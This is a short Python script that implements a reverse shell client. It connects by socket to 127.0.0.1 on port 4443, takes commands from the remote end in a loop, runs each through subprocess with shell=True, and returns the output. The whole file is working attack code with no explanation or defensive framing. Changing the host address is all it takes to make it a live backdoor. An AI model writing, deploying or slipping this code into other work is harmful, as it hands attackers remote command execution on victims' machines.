import socket
import subprocess
ip1="127.0.0.1"
port1=4443
client=socket.socket()
client.connect((ip1,port1))
while True:
    cmd=client.recv(1024)
    cmd=cmd.decode()
    ops=subprocess.Popen(cmd, shell=True,stdout=subprocess.PIPE)
    output=ops.stdout.read()
    client.send(output)
